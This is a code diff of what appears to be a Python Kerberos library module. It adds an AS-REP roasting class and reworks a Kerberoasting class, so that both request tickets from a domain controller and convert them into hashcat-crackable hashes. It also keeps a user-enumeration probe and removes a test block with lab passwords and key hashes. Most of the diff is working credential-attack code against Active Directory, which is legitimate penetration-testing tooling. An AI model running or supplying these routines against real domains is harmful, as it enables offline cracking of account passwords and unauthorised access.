@@ -1,6 +1,6 @@
-from .communication import *
-from .common import TGSTicket2hashcat
-
+from minikerberos.communication import *
+from minikerberos.common import TGSTicket2hashcat
+from minikerberos import logger
 
 class KerberosEtypeTest:
 	# TODO: implement this
@@ -47,7 +47,7 @@ class KerberosUserEnum:
 			logging.debug('Probing user %s' % user)
 			req = KerberosUserEnum.construct_tgt_req(realm, user)
 			rep = self.ksoc.sendrecv(req.dump(), throw = False)
-					
+			
 			if rep.name != 'KRB_ERROR':	
 				# user doesnt need preauth, but it exists
 				existing_users.append(user)
@@ -62,7 +62,32 @@ class KerberosUserEnum:
 
 		return existing_users
 
+class APREPRoast:
+	def __init__(self, ksoc):
+		self.ksoc = ksoc
 
+	def run(self, creds, override_etype = [23]):
+		"""
+		Requests TGT tickets for all users specified in the targets list
+		creds: list : the users to request the TGT tickets for
+		override_etype: list : list of supported encryption types
+		"""			
+		tgts = []
+		for cred in creds:
+			try:
+				kcomm = KerbrosComm(cred, self.ksoc)
+				kcomm.get_TGT(override_etype = override_etype, decrypt_tgt = False)
+				tgts.append(kcomm.kerberos_TGT)
+			except Exception as e:
+				logger.debug('Error while roasting client %s/%s Reason: %s' % (cred.domain, cred.username, str(e)))
+				continue
+
+		results = []
+		for tgt in tgts:
+			results.append(TGTTicket2hashcat(tgt))
+
+
+		return results
 
 class Kerberoast:
 	def __init__(self, ccred, ksoc, kcomm = None):
@@ -70,53 +95,32 @@ class Kerberoast:
 		self.ksoc = ksoc
 		self.kcomm = kcomm
 
-	def run(self, targets, allhash = False):
+	def run(self, targets, override_etype = [2, 3, 16, 23, 17, 18]):
 		"""
 		Requests TGS tickets for all service users specified in the targets list
 		targets: list : the SPN users to request the TGS tickets for
 		allhash: bool : Return all enctype tickets, ot just 23
 		"""
 		if not self.kcomm:
-			self.kcomm = KerbrosComm(self.ccred, self.ksoc)
-			self.kcomm.get_TGT()
+			try:
+				self.kcomm = KerbrosComm(self.ccred, self.ksoc)
+				self.kcomm.get_TGT()
+			except Exception as e:
+				logger.exception('Failed to get TGT ticket! Reason: %s' % str(e))
+				return
+		
 		tgss = []
 		for target in targets:
-			tgs, encTGSRepPart, key = self.kcomm.get_TGS(target, override_etype = [2, 3, 16, 23, 17, 18])
-			tgss.append(tgs)
-		
+			try:
+				tgs, encTGSRepPart, key = self.kcomm.get_TGS(target, override_etype = override_etype)
+				tgss.append(tgs)
+			except Exception as e:
+				logger.debug('Failed to get TGS ticket for user %s/%s/%s! Reason: %s' % (target.domain, str(target.service), target.username, str(e)))
+				continue
+
 		results = []
 		for tgs in tgss:
-			if int(tgs['ticket']['enc-part']['etype']) == 23 or allhash:
-				results.append(TGSTicket2hashcat(tgs))
+			results.append(TGSTicket2hashcat(tgs))
 
 
 		return results
-
-if __name__ == '__main__':
-	logging.basicConfig(level=logging.DEBUG)
-	
-	ccred = User()
-	ccred.username = 'victim'
-	ccred.domain = 'TEST.corp'
-	ccred.password = 'Almaalmaalma!1'
-	ccred.NT = 'df85f802490f0384233c895f06ba2011'
-	ccred.kerberos_key_aes_256 = 'd3f3593c9debec0be8db57b160f6b0f0c82fb4c0e5dcaa1e1e26ceddcfd05f60'
-	ccred.kerberos_key_aes_128 = 'fa021d1bf218a731bad4c19b5bcaae8c'
-	
-	target = TargetUser()
-	target.username = 'FileServer'
-	target.service = None
-	target.domain = 'TEST.corp' #the kerberos realm
-	
-	ksoc = KerberosSocket('192.168.9.1')
-
-	kr = Kerberoast(ccred, ksoc)
-	kr.run([target])
-
-	#### user enum test
-	users = ['blabla', 'victim', 'Administrator']
-	realm = 'TEST.corp'
-
-	kue = KerberosUserEnum(ksoc)
-	u = kue.run(realm, users)
-	print(u)
